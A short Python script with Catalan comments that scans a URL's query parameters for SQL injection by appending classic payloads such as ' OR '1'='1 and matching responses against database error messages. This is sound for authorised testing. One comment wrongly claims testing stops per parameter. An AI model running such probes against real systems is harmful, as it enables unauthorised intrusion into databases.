import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def escaner_sqli(url):
    # analitza l'url per detectar possibles vulnerabilitats d'injecció sql
    resultats = {"vulnerable": False, "bugs": []}

    # verifica si l'url conté paràmetres per realitzar la injecció
    parsed = urlparse(url)
    if not parsed.query:
        resultats["info"] = "l'url no té paràmetres per analitzar"
        return resultats

    # defineix vectors d'atac comuns per provocar errors de sintaxi sql
    # inclou cometes i operadors lògics per manipular la consulta
    payloads = [
        "'", 
        '"', 
        " OR 1=1", 
        "' OR '1'='1", 
        "';--", 
        ") OR (1=1",
        "' OR '1'='1' -- "
    ]

    # llista d'errors estàndard retornats pels gestors de bases de dades
    errors_db = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "microsoft ole db provider for sql server",
        "java.sql.sqlexception",
        "syntax error",
        "ora-00933",
        "postgresql query failed"
    ]

    # extreu els paràmetres de la consulta per manipular-los
    params = parse_qs(parsed.query)

    # itera sobre cada paràmetre per injectar els payloads
    for param, valors in params.items():
        valor_original = valors[0] # utilitza el primer valor trobat

        for trampa in payloads:
            # crea una còpia dels paràmetres per inserir la injecció
            params_bruts = params.copy()
            # concatena el payload al valor original per alterar la lògica
            params_bruts[param] = valor_original + trampa
            
            # reconstrueix l'url amb la consulta modificada
            query_bruta = urlencode(params_bruts, doseq=True)
            url_atac = urlunparse(parsed._replace(query=query_bruta))

            try:
                # realitza la petició http amb el payload injectat
                resp = requests.get(url_atac, timeout=5)
                
                # analitza si el cos de la resposta conté errors de base de dades
                text_resposta = resp.text.lower()
                for error in errors_db:
                    if error in text_resposta:
                        troballa = f"paràmetre '{param}' vulnerable amb '{trampa}' -> error: {error}"
                        # registra la vulnerabilitat si no ha estat detectada prèviament
                        if troballa not in resultats["bugs"]:
                            resultats["bugs"].append(troballa)
                            resultats["vulnerable"] = True
                        break # atura les proves per a aquest paràmetre si ja és vulnerable
            except:
                # omet l'intent en cas d'error de connexió o temps d'espera
                pass
    
    # indica si l'anàlisi ha finalitzat sense detectar errors crítics
    if not resultats["bugs"]:
        resultats["info"] = "no s'han detectat errors sql evidents"
    
    return resultats